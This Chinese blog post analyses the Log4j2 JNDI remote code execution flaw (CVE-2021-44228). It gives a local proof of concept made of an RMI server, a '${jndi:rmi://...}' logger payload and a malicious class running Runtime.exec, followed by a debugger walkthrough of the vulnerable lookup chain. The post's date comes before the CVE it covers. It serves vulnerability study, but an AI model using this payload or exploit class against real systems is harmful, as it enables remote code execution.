---
title: log4j2漏洞分析（CVE-2021-44228）
date: 2021-2-25
tags:
 - Vulnerabilities
 - 笔记
categories:
 - Vulnerabilities

---

## log4j2漏洞分析（CVE-2021-44228）

### 0x01 漏洞描述

Apache Log4j2 是 Apache 的一个开源项目，Apache Log4j2 是一个基于 Java 的日志记录工具，使用非常广泛，被大量企业和系统索使用，漏洞触发及其简单，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置。

影响范围：Apache Log4j 2.x<=2.14.1

### 0x02 漏洞复现

使用maven引入相关组件，相应的pom.xml文件：

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version>
    </dependency>
</dependencies>
```

下面的复现利用的是log4j2提供的jndi功能，自己手动构建恶意类的方式调用

服务端：

```java
public class Rmiserver {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(12345);
        Reference reference = new Reference("Hello", "Hello",
                "http://127.0.0.1:8080/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj", referenceWrapper);
    }
}
```

客户端：

```java
public class Log4jTEst {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
        logger.error("${jndi:rmi://127.0.0.1:12345/obj}");
    }
}
```

恶意类：

```java
public class Hello implements ObjectFactory  {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("hello");
        Runtime.getRuntime().exec("calc");
        return null;
    }
}
```

复现：

![image-20220606150933683](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606150934.png)

### 0x03 漏洞调用链分析

在入口点logger.error()打上断点：

![image-20220606151109583](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606151109.png)

进入`org.apache.logging.log4j.spi#error`：

![image-20220606151733961](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606151734.png)

`org.apache.logging.log4j.spi#logIfEnabled`：

![image-20220606152129024](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152129.png)

`org.apache.logging.log4j.spi#logMessageTrackRecursion`：

![image-20220606152226076](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152226.png)

就这样一步步递归，走到关键点`org.apache.logging.log4j.core.appender#directEncodeEvent`。该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法

![image-20220606152427303](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152427.png)

log4j2默认缺省布局使用的是PatternLayout：

![image-20220606152908926](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152909.png)

继续跟进在encode中会调用toText方法，根据注释该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。`org.apache.logging.log4j.core.layout#encode`

![image-20220606153233315](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153233.png)

跟进toText方法：`org.apache.logging.log4j.core.layout#toText`

![image-20220606153334624](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153334.png)

接下来会调用`serializer.toSerializable`，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，

这里一步步将event添加到buf中：

![image-20220606153723600](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153723.png)

一直添加到：

![image-20220606153811581](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153811.png)

开始解析`${`。`org.apache.logging.log4j.core.pattern#format`

![image-20220606154019040](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606154019.png)

下面有一个关键点。这里对日志消息进行格式化，其中很明显的看到有针对字符”$”和”{“的判断，而且是连着判断，等同于判断是否存在”${“，这三行代码中关键点在于最后一行

![image-20220606154051465](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606154051.png)

![image-20220606154441647](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606154442.png)

注意此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示

```
15.23.39.893 [main] ERROR Log4jTEst - ${jndi:rmi://127.0.0.1/obj}
```

本来这段字符串的长度是63，但是却给它改成了38，为什么呢？因为第38的位置就是`$`符号，也就是说只保留`$`之前的，`${jndi:rmi://127.0.0.1/obj}`这段不要了，从第38位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是`${jndi:rmi://127.0.0.1/obj}`这段字符串。也就是说这里append的字符串就是这段字符串replace后的内容。

replace的作用简单来说就是想要进行一个替换，我们继续跟进`org.apache.logging.log4j.core.lookup#replace`：

![image-20220606155051249](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606155051.png)

经过一系列的嵌套调用，来到了`org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute`。StrSubstitutor类提供了关键的 `DEFAULT_ESCAPE` 是 `$`，`DEFAULT_PREFIX` 前缀是 `${`，`DEFAULT_SUFFIX` 后缀是 `}`，`DEFAULT_VALUE_DELIMITER_STRING` 赋值分隔符是 `:-`，`ESCAPE_DELIMITER_STRING` 是 `:\-`

![image-20220606200449819](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200450.png)

这个类提供的 `substitute` 方法，是整个 Lookup 功能的核心，用来递归替换相应的字符，这里来仔细看一下处理逻辑。

方法通过 while 循环逐个字符串寻找 `${` 前缀

![image-20220606200554339](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200554.png)

找到前缀后开始找后缀，但是在找后缀的 while 循环里，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果又找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，用来满足变量中嵌套的情况。

![image-20220606200711471](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200711.png)

后续的处理中，通过多个 if/else 用来匹配 `:-` 和 `:\-`

![image-20220606200812347](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200812.png)

![image-20220606200846234](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200846.png)

在没有匹配到变量赋值或处理结束后，将会调用 `resolveVariable` 方法解析满足 Lookup 功能的语法，并执行相应的 lookup ，将返回的结果替换回原字符串后，再次调用 `substitute` 方法进行递归解析。

![image-20220606155354466](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606155354.png)

跟进`org.apache.logging.log4j.core.lookup#resolveVariable`调用了lookup函数。

![image-20220606155814564](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606155814.png)

而这实际上是一个代理类 `Interpolator`，这个类在初始化时创建了一个 `strLookupMap` ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中

![image-20220606160238614](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160238.png)

处理和分发的关键逻辑在于其 `lookup` 方法，通过 `:` 作为分隔符来分隔 Lookup 关键字及参数，从`strLookupMap` 中根据关键字`jndi`作为 key 匹配到对应的处理类`jndiLookup`，并调用其 lookup 方法。

![image-20220606160340327](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160340.png)

![image-20220606160429996](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160430.png)

由此调用了jndiLookup方法，弹出了计算器

![image-20220606160615534](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160616.png)

### 0x04 参考文献

* [从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228漏洞](https://www.anquanke.com/post/id/263325)
* [浅谈 Log4j2 漏洞](https://tttang.com/archive/1378/)
* [史上最全 log4j2 远程命令执行漏洞汇总报告](https://cloud.tencent.com/developer/article/1919456)
* [Log4j2 研究之lookup](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247485584&idx=1&sn=2fad11942986807ea7545f7b8b5d6af8&scene=21#wechat_redirect)